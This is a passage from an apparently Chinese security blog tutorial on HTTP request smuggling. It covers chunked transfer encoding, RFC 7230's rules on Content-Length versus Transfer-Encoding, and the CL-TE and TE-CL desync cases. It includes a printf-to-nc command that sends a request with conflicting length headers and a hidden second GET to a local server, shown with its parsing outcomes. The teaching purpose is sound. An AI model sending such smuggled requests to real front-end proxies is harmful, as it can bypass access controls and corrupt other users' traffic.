rel="noopener">&#x5229;&#x7528;&#x5206;&#x5757;&#x4F20;&#x8F93;&#x540A;&#x6253;&#x6240;&#x6709;WAF</a>&#xFF0C;&#x4E5F;&#x662F;&#x6BD4;&#x8F83;&#x6709;&#x610F;&#x601D;&#x7684; bypass &#x6280;&#x5DE7;&#x3002;</p><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;<a href="https://tools.ietf.org/html/rfc7230#section-4.1" target="_blank" rel="noopener">RFC7230</a>&#x4E2D;&#x67E5;&#x770B;&#x5230;&#x6709;&#x5173;&#x5206;&#x5757;&#x4F20;&#x8F93;&#x7684;&#x5B9A;&#x4E49;&#x89C4;&#x8303;&#x3002;</p><blockquote><p>4.1.  Chunked Transfer Coding</p><p>   The chunked transfer coding wraps the payload body in order to<br>   transfer it as a series of chunks, each with its own size indicator,<br>   followed by an OPTIONAL trailer containing header fields.  Chunked<br>   enables content streams of unknown size to be transferred as a<br>   sequence of length-delimited buffers, which enables the sender to<br>   retain connection persistence and the recipient to know when it has<br>   received the entire message.</p><pre><code>chunked-body   = *chunk                 last-chunk                 trailer-part                 CRLFchunk          = chunk-size [ chunk-ext ] CRLF                 chunk-data CRLFchunk-size     = 1*HEXDIGlast-chunk     = 1*(&quot;0&quot;) [ chunk-ext ] CRLFchunk-data     = 1*OCTET ; a sequence of chunk-size octets</code></pre><p>   The chunk-size field is a string of hex digits indicating the size of<br>   the chunk-data in octets.  The chunked transfer coding is complete<br>   when a chunk with a chunk-size of zero is received, possibly followed<br>   by a trailer, and finally terminated by an empty line.</p><p>   A recipient MUST be able to parse and decode the chunked transfer<br>   coding.</p><p>4.1.1.  Chunk Extensions</p><p>   The chunked encoding allows each chunk to include zero or more chunk<br>   extensions, immediately following the chunk-size, for the sake of<br>   supplying per-chunk metadata (such as a signature or hash),<br>   mid-message control information, or randomization of message body<br>   size.</p><pre><code>chunk-ext      = *( &quot;;&quot; chunk-ext-name [ &quot;=&quot; chunk-ext-val ] )chunk-ext-name = tokenchunk-ext-val  = token / quoted-string</code></pre><p>   The chunked encoding is specific to each connection and is likely to<br>   be removed or recoded by each recipient (including intermediaries)<br>   before any higher-level application would have a chance to inspect<br>   the extensions.  Hence, use of chunk extensions is generally limited</p><p>   to specialized HTTP services such as &#x201C;long polling&#x201D; (where client and<br>   server can have shared expectations regarding the use of chunk<br>   extensions) or for padding within an end-to-end secured connection.</p><p>   A recipient MUST ignore unrecognized chunk extensions.  A server<br>   ought to limit the total length of chunk extensions received in a<br>   request to an amount reasonable for the services provided, in the<br>   same way that it applies length limitations and timeouts for other<br>   parts of a message, and generate an appropriate 4xx (Client Error)<br>   response if that amount is exceeded.</p></blockquote><p>&#x8FD9;&#x91CC;&#x5982;&#x679C;&#x4F60;&#x4E0D;&#x60F3;&#x770B;&#x7684;&#x592A;&#x4ED4;&#x7EC6;&#xFF0C;&#x6211;&#x4EEC;&#x53EA;&#x9700;&#x8981;&#x4E86;&#x89E3;&#x5B83;&#x662F;&#x600E;&#x4E48;&#x4E00;&#x79CD;&#x7ED3;&#x6784;&#x5C31;&#x884C;&#x4E86;&#xFF0C;&#x8FD9;&#x91CC;&#x4E5F;&#x53EF;&#x4EE5;&#x53C2;&#x8003; <a href="https://en.wikipedia.org/wiki/Chunked_transfer_encoding" target="_blank" rel="noopener">Wiki: Chunked transfer encoding</a> &#xFF0C;&#x6BD4;&#x5982;&#x8BF4;&#x6211;&#x4EEC;&#x5982;&#x679C;&#x8981;&#x4F7F;&#x7528; chunked &#x53D1;&#x9001;&#x4EE5;&#x4E0B;&#x6D88;&#x606F;</p><figure class="highlight taggerscript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Wikipedia in<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>chunks.</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8FD9;&#x4E48;&#x53BB;&#x53D1;&#x9001;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POSTT</span> <span class="hljs-string">/xxx</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: xxx</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: text/plain </span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="hljs-attribute">4\r\n</span></span><br><span class="line"><span class="hljs-attribute">Wiki\r\n</span></span><br><span class="line"><span class="hljs-attribute">5\r\n</span></span><br><span class="line"><span class="hljs-attribute">pedia\r\n</span></span><br><span class="line"><span class="hljs-attribute">e\r\n</span></span><br><span class="line"> in\r\n\r\nchunks.\r\n</span><br><span class="line"><span class="hljs-attribute">0\r\n</span></span><br><span class="line"><span class="hljs-attribute">\r\n</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x505A;&#x4E2A;&#x7B80;&#x5355;&#x89E3;&#x91CA;&#xFF0C;<strong>&#x6211;&#x4EEC;&#x4F7F;&#x7528;<code>\r\n</code>&#x8868;&#x793A; CRLF &#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x7684;<code>\r\n</code>&#x662F;&#x4E24;&#x4E2A;&#x5B57;&#x8282;</strong>&#xFF1B;&#x7B2C;&#x4E00;&#x4E2A;&#x6570;&#x5B57; 4 &#x8868;&#x793A;&#x7684;&#x662F;&#x63A5;&#x4E0B;&#x6765;&#x4F1A;&#x6709; 4 &#x4E2A;&#x5B57;&#x8282;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F; Wiki &#x8FD9; 4 &#x4E2A;&#x5B57;&#x6BCD;&#xFF0C;&#x7136;&#x540E;&#x6309;&#x7167; RFC &#x6587;&#x6863;&#x6807;&#x51C6;&#xFF0C;&#x5B57;&#x6BCD; Wiki &#x90E8;&#x5206;&#x540E;&#x9762;&#x9700;&#x8981;&#x8DDF;<code>\r\n</code>&#x8868;&#x793A; chunk-data &#x90E8;&#x5206;&#xFF0C;&#x6570;&#x5B57; 4 &#x540E;&#x9762;&#x9700;&#x8981;&#x8DDF;<code>\r\n</code>&#x8868;&#x793A; chunk-size &#x90E8;&#x5206;&#xFF0C;&#x800C;&#x4E14;&#x8FD9;&#x4E2A;&#x6570;&#x5B57;&#x662F;&#x4E2A;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x6570;&#xFF0C;&#x6BD4;&#x5982;&#x7B2C;&#x4E09;&#x4E2A;&#x6570;&#x636E;&#xFF0C;</p><figure class="highlight taggerscript hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br><span class="line">in<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span><span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>chunks.<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span></span><br></pre></td></tr></table></figure><p>&#x8FD9;&#x91CC;&#x7B2C;&#x4E00;&#x4E2A;&#x5B58;&#x5728;&#x7A7A;&#x683C;&#xFF0C;&#x6570;&#x636E;&#x5F53;&#x4E2D;&#x7684;<code>\r\n</code>&#x7B97;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#xFF0C;&#x6700;&#x540E;&#x4E00;&#x4E2A;<code>\r\n</code>&#x8868;&#x793A;&#x6570;&#x636E;&#x7ED3;&#x675F;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x8BDD;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x7A7A;&#x683C; 1 &#x4E2A;&#x5B57;&#x8282; + in 2&#x4E2A;&#x5B57;&#x8282; + 2 &#x4E2A; <code>\r\n</code> &#x7B97; 4 &#x4E2A;&#x5B57;&#x8282; + chunks. 7&#x4E2A;&#x5B57;&#x8282; = 14 &#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x8868;&#x793A; 14 &#x4E5F;&#x5C31;&#x662F; e &#x3002;</p><p>&#x6700;&#x540E;&#x4E00;&#x4E2A;<code>0\r\n\r\n</code>&#x8868;&#x793A; chunk &#x90E8;&#x5206;&#x7ED3;&#x675F;&#x3002; </p><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>&#x672C;&#x8EAB;&#x8FD9;&#x4E9B;&#x4E1C;&#x897F;&#x662F;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x5371;&#x5BB3;&#x7684;&#xFF0C;&#x90FD;&#x662F;&#x901A;&#x8FC7;&#x5404;&#x79CD;&#x65B9;&#x5F0F;&#x63D0;&#x9AD8;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#x901F;&#x7387;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x4E00;&#x4E9B;&#x7279;&#x6B8A;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x5C31;&#x4F1A;&#x51FA;&#x73B0;&#x4E86;&#x4E00;&#x4E9B;&#x76F8;&#x5E94;&#x7684;&#x5B89;&#x5168;&#x95EE;&#x9898;&#x3002;</p><blockquote><p>&#x200B;    &#x4E3A;&#x4E86;&#x63D0;&#x5347;&#x7528;&#x6237;&#x7684;&#x6D4F;&#x89C8;&#x901F;&#x5EA6;&#xFF0C;&#x63D0;&#x9AD8;&#x4F7F;&#x7528;&#x4F53;&#x9A8C;&#xFF0C;&#x51CF;&#x8F7B;&#x670D;&#x52A1;&#x5668;&#x7684;&#x8D1F;&#x62C5;&#xFF0C;&#x5F88;&#x591A;&#x7F51;&#x7AD9;&#x90FD;&#x7528;&#x4E0A;&#x4E86;CDN&#x52A0;&#x901F;&#x670D;&#x52A1;&#xFF0C;&#x6700;&#x7B80;&#x5355;&#x7684;&#x52A0;&#x901F;&#x670D;&#x52A1;&#xFF0C;&#x5C31;&#x662F;&#x5728;&#x6E90;&#x7AD9;&#x7684;&#x524D;&#x9762;&#x52A0;&#x4E0A;&#x4E00;&#x4E2A;&#x5177;&#x6709;&#x7F13;&#x5B58;&#x529F;&#x80FD;&#x7684;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x7528;&#x6237;&#x5728;&#x8BF7;&#x6C42;&#x67D0;&#x4E9B;&#x9759;&#x6001;&#x8D44;&#x6E90;&#x65F6;&#xFF0C;&#x76F4;&#x63A5;&#x4ECE;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E2D;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x5230;&#xFF0C;&#x4E0D;&#x7528;&#x518D;&#x4ECE;&#x6E90;&#x7AD9;&#x6240;&#x5728;&#x670D;&#x52A1;&#x5668;&#x83B7;&#x53D6;&#x3002;&#x8FD9;&#x5C31;&#x6709;&#x4E86;&#x4E00;&#x4E2A;&#x5F88;&#x5178;&#x578B;&#x7684;&#x62D3;&#x6251;&#x7ED3;&#x6784;&#x3002;</p></blockquote><p>&#x8FD9;&#x91CC;&#x5F15;&#x7528; @mengchen &#x5E08;&#x5085;&#x53D1;&#x7684;&#x56FE;&#xFF1A;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191205171057.png" alt></p><p>&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x4E0E;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x4E0D;&#x4F1A;&#x4F7F;&#x7528; pipeline &#x6280;&#x672F;&#xFF0C;&#x751A;&#x81F3;&#x4E5F;&#x4E0D;&#x4F1A;&#x53BB;&#x4F7F;&#x7528; Keep-Alive &#xFF0C;&#x66F4;&#x591A;&#x65F6;&#x5019;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x91C7;&#x53D6;&#x7684;&#x63AA;&#x65BD;&#x662F;&#x91CD;&#x7528; TCP &#x94FE;&#x63A5;&#xFF0C;&#x56E0;&#x4E3A;&#x5BF9;&#x4E8E;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x4E0E;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x6765;&#x8BF4;&#xFF0C;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0E;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668; IP &#x76F8;&#x5BF9;&#x56FA;&#x5B9A;&#xFF0C;&#x4E0D;&#x540C;&#x7528;&#x6237;&#x7684;&#x8BF7;&#x6C42;&#x901A;&#x8FC7;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x4E0E;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5EFA;&#x7ACB;&#x94FE;&#x63A5;&#xFF0C;&#x5C06;&#x8FD9;&#x4E24;&#x8005;&#x4E4B;&#x95F4;&#x7684; TCP &#x94FE;&#x63A5;&#x8FDB;&#x884C;&#x91CD;&#x7528;&#xFF0C;&#x4E5F;&#x5C31;&#x987A;&#x7406;&#x6210;&#x7AE0;&#x4E86;&#x3002;</p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132520.png" alt></p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132258.png" alt></p><p><img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191130132605.png" alt></p><blockquote><p>&#x200B;    &#x5F53;&#x6211;&#x4EEC;&#x5411;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x6A21;&#x7CCA;&#x7684;HTTP&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x7531;&#x4E8E;&#x4E24;&#x8005;&#x670D;&#x52A1;&#x5668;&#x7684;&#x5B9E;&#x73B0;&#x65B9;&#x5F0F;&#x4E0D;&#x540C;&#xFF0C;&#x53EF;&#x80FD;&#x4EE3;&#x7406;&#x670D;&#x52A1;&#x5668;&#x8BA4;&#x4E3A;&#x8FD9;&#x662F;&#x4E00;&#x4E2A;HTTP&#x8BF7;&#x6C42;&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x5176;&#x8F6C;&#x53D1;&#x7ED9;&#x4E86;&#x540E;&#x7AEF;&#x7684;&#x6E90;&#x7AD9;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4F46;&#x6E90;&#x7AD9;&#x670D;&#x52A1;&#x5668;&#x7ECF;&#x8FC7;&#x89E3;&#x6790;&#x5904;&#x7406;&#x540E;&#xFF0C;&#x53EA;&#x8BA4;&#x4E3A;&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x90E8;&#x5206;&#x4E3A;&#x6B63;&#x5E38;&#x8BF7;&#x6C42;&#xFF0C;&#x5269;&#x4E0B;&#x7684;&#x90A3;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x5C31;&#x7B97;&#x662F;&#x8D70;&#x79C1;&#x7684;&#x8BF7;&#x6C42;&#xFF0C;&#x5F53;&#x8BE5;&#x90E8;&#x5206;&#x5BF9;&#x6B63;&#x5E38;&#x7528;&#x6237;&#x7684;&#x8BF7;&#x6C42;&#x9020;&#x6210;&#x4E86;&#x5F71;&#x54CD;&#x4E4B;&#x540E;&#xFF0C;&#x5C31;&#x5B9E;&#x73B0;&#x4E86;HTTP&#x8D70;&#x79C1;&#x653B;&#x51FB;&#x3002;</p></blockquote><p>HTTP Smuggling &#x653B;&#x51FB;&#x6B63;&#x662F;&#x57FA;&#x4E8E;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x4E0E;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x5BF9;&#x4E8E; HTTP &#x8BF7;&#x6C42;&#x89E3;&#x6790;&#x5904;&#x7406;&#x4E0D;&#x4E00;&#x81F4;&#xFF0C;&#x5229;&#x7528;&#x8FD9;&#x79CD;&#x5DEE;&#x5F02;&#x6027;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5728;&#x4E00;&#x4E2A; HTTP &#x8BF7;&#x6C42;&#x4E2D; &#x201C;&#x5D4C;&#x5165;&#x201D; &#x53E6;&#x4E00;&#x4E2A; HTTP &#x8BF7;&#x6C42;&#xFF0C;&#x4EE5;&#x8FBE;&#x5230;&#x6211;&#x4EEC;&#x201C;&#x8D70;&#x79C1;&#x201D;&#x8BF7;&#x6C42;&#x7684;&#x76EE;&#x7684;&#xFF0C;&#x76F4;&#x63A5;&#x8868;&#x73B0;&#x4E3A;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE;&#x5185;&#x7F51;&#x670D;&#x52A1;&#xFF0C;&#x6216;&#x8005;&#x9020;&#x6210;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684;&#x653B;&#x51FB;&#x3002;</p><h2 id="Attack-Method"><a href="#Attack-Method" class="headerlink" title="Attack Method"></a>Attack Method</h2><p>&#x65E2;&#x7136;&#x662F;&#x57FA;&#x4E8E;&#x89E3;&#x6790;&#x5DEE;&#x5F02;&#xFF0C;&#x90A3;&#x6211;&#x4EEC;&#x4F1A;&#x6709;&#x4EC0;&#x4E48;&#x89E3;&#x6790;&#x5DEE;&#x5F02;&#x5462;&#xFF1F;&#x573A;&#x666F;&#x4ECD;&#x7136;&#x662F;&#x4E0A;&#x8FF0;&#x6784;&#x67B6;&#x7684;&#x573A;&#x666F;&#xFF0C;&#x53EA;&#x4E0D;&#x8FC7;&#x6211;&#x4EEC;&#x7B80;&#x5316;&#x4E00;&#x4E0B;&#xFF0C;&#x628A;&#x540E;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#x56FA;&#x5B9A;&#x4E3A;&#x4E00;&#x53F0;&#xFF0C;&#x5C31;&#x4E0D;&#x5B58;&#x5728;&#x67D0;&#x4E9B;&#x6982;&#x7387;&#x7684;&#x60C5;&#x51B5;&#x4E86;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#xFF0C;&#x67B6;&#x6784;&#x7C7B;&#x4F3C;&#x4E8E;&#x5982;&#x4E0B;&#x793A;&#x610F;&#x56FE;&#xFF1A;</p><figure class="highlight gherkin hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">User            Front           Backend</span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">               </span>|</span><br><span class="line">|<span class="hljs-string">------A-------&gt;</span>|<span class="hljs-string">               </span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">-------A------&gt;</span>|<span class="hljs-string"> </span></span><br><span class="line">|<span class="hljs-string">               </span>|<span class="hljs-string">&lt;-A(200)-------</span>|</span><br><span class="line">|<span class="hljs-string">&lt;-A(200)-------</span>|<span class="hljs-string">               </span>|</span><br></pre></td></tr></table></figure><p>&#x6211;&#x4EEC;&#x77E5;&#x9053; Content-Length &#x4E0E; Transfer-Encoding &#x5747;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A; POST &#x6570;&#x636E;&#x4F20;&#x8F93;&#x65F6;&#x5904;&#x7406; body &#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x9605;&#x8BFB;&#x4EE5;&#x53CA;&#x7801;&#x5B57;&#xFF0C;&#x6211;&#x4EEC;&#x5BF9;&#x5B57;&#x6BB5;&#x5904;&#x7406;&#x4F18;&#x5148;&#x89C4;&#x5219;&#x6709;&#x4EE5;&#x4E0B;&#x7B80;&#x5199;&#x89C4;&#x5219;&#xFF1A;</p><ul><li>CL-TE &#x4EE3;&#x8868; Front &#x4EE5; Content-Length &#x4F18;&#x5148;&#x5904;&#x7406;&#xFF0C;Backend &#x4EE5; Transfer-Encoding &#x4F18;&#x5148;&#x5904;&#x7406;</li><li>TE-CL &#x4EE3;&#x8868; Front &#x4EE5; Transfer-Encoding &#x4F18;&#x5148;&#x5904;&#x7406;&#xFF0C;Backend &#x4EE5; Content-Length &#x4F18;&#x5148;&#x5904;&#x7406;</li></ul><p>&#x5E76;&#x4E14; Front &#x4EE3;&#x8868;&#x7684;&#x662F;&#x53CD;&#x5411;&#x4EE3;&#x7406;&#x7B49;&#x5178;&#x578B;&#x7684;&#x524D;&#x7AEF;&#x670D;&#x52A1;&#x5668;&#xFF0C;Backend &#x4EE3;&#x8868;&#x7684;&#x662F;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x7684;&#x540E;&#x7AEF;&#x4E1A;&#x52A1;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4EE5;&#x4E0B;&#x5747;&#x7531;<code>\r\n</code>&#x4EE3;&#x66FF; CRLF&#xFF0C;&#x957F;&#x5EA6;&#x4E3A;&#x4E24;&#x4E2A;&#x5B57;&#x8282;&#x3002;</p><h3 id="Chunks-Priority-On-Content-Length"><a href="#Chunks-Priority-On-Content-Length" class="headerlink" title="Chunks Priority On Content-Length"></a>Chunks Priority On Content-Length</h3><p>&#x6709;&#x4E9B;&#x540C;&#x5B66;&#x53EF;&#x80FD;&#x770B;&#x5230;&#x8FD9;&#x8DDF;&#x6211;&#x4F1A;&#x6709;&#x540C;&#x6837;&#x7684;&#x7591;&#x60D1;&#xFF0C;&#x5BF9;&#x4E8E; CL &amp; TE &#x89E3;&#x6790;&#x4F18;&#x5148;&#x7EA7;&#x987A;&#x5E8F;&#x7684;&#x95EE;&#x9898;&#x96BE;&#x9053; RFC &#x6587;&#x6863;&#x6CA1;&#x6709;&#x505A;&#x51FA;&#x89C4;&#x8303;&#x5316;&#x561B;&#xFF1F;&#x6709;&#x5F53;&#x7136;&#x662F;&#x6709;&#x7684;&#xFF0C;&#x89C1; <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">RFC 7230 Message Body Length</a></p><blockquote><p>&#x200B;    If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length.  Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting  (Section 9.4) and ought to be handled as an error.  A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</p></blockquote><p>&#x867D;&#x7136;&#x8FD9;&#x91CC;&#x662F;&#x6307;&#x51FA;&#x4E86; TL &#x4F18;&#x5148;&#x4E8E; CL &#xFF0C;&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x4ECD;&#x7136;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x65B9;&#x5F0F;&#x7ED5;&#x8FC7;&#xFF0C;&#x53C8;&#x6216;&#x8005;&#x8BF4;&#xFF0C;&#x90A3;&#x4E2A;&#x4E2D;&#x95F4;&#x4EF6;&#x7684;&#x4E5F;&#x6CA1;&#x6709;&#x4F9D;&#x7167;&#x8FD9;&#x4E2A; RFC &#x6807;&#x51C6;&#x89C4;&#x8303;&#x5B9E;&#x73B0;&#xFF0C;&#x8FD9;&#x5C31;&#x5BFC;&#x81F4;&#x4E86;&#x5DEE;&#x5F02;&#x6027;&#x7684;&#x5B58;&#x5728;&#x3002;</p><p>&#x4F8B;&#x5982;&#x6211;&#x4EEC;&#x4F7F;&#x7528;&#x4EE5;&#x4E0B;&#x4EE3;&#x7801;&#x6765;&#x53D1;&#x9001; HTTP &#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight bash hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-built_in">printf</span> <span class="hljs-string">&apos;GET / HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Content-length:56\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Transfer-Encoding: chunked\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;0\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;GET /tmp HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;GET /tests HTTP/1.1\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Host:localhost\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;Dummy:Header\r\n&apos;</span>\</span><br><span class="line"><span class="hljs-string">&apos;\r\n&apos;</span>\</span><br><span class="line">| nc -q3 127.0.0.1 8080</span><br></pre></td></tr></table></figure><p>&#x4EE5;&#x4E0A;&#x6B63;&#x786E;&#x7684;&#x89E3;&#x6790;&#x5E94;&#x8BE5;&#x662F;&#x89E3;&#x6790;&#x6210;&#x4E09;&#x4E2A;&#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Content-length:56</span></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br><span class="line"><span class="hljs-attribute"></span></span><br><span class="line"><span class="hljs-attribute">0</span></span><br></pre></td></tr></table></figure><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tmp</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br></pre></td></tr></table></figure><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tests</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br></pre></td></tr></table></figure><p>&#x800C;&#x5982;&#x679C;&#x5B58;&#x5728; TE &amp; CL &#x4F18;&#x5148;&#x7EA7;&#x95EE;&#x9898;&#x7684;&#x8BDD;&#xFF0C;&#x4F1A;&#x88AB;&#x89E3;&#x6790;&#x6210;&#x4E24;&#x4E2A;&#x8BF7;&#x6C42;&#xFF1A;</p><figure class="highlight hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1[CRLF]</span><br><span class="line"><span class="hljs-attribute">Host:localhost[CRLF]</span></span><br><span class="line"><span class="hljs-attribute">Content-length:56[CRLF]</span></span><br><span class="line"><span class="hljs-attribute">Transfer-Encoding</span>: chunked[CRLF] (ignored and removed, hopefully)</span><br><span class="line"><span class="hljs-attribute">Dummy:Header[CRLF]</span></span><br><span class="line"><span class="hljs-attribute">[CRLF]</span></span><br><span class="line">0[CRLF]  (start of 56 bytes of body)</span><br><span class="line">[CRLF]</span><br><span class="line">GET /tmp HTTP/1.1[CRLF]</span><br><span class="line"><span class="hljs-attribute">Host:localhost[CRLF]</span></span><br><span class="line">Dummy:Header[CRLF] (end of 56 bytes of body, not parsed)</span><br></pre></td></tr></table></figure><figure class="highlight http hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">GET</span> <span class="hljs-string">/tests</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host:localhost</span></span><br><span class="line"><span class="hljs-attribute">Dummy:Header</span></span><br></pre></td></tr></table></figure><h3 id="Bad-Chunked-Transmission"><a href="#Bad-Chunked-Transmission" class="headerlink" title="Bad Chunked Transmission"></a>Bad Chunked Transmission</h3><p>&#x6839;&#x636E; <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3" target="_blank" rel="noopener">RFC7230 section 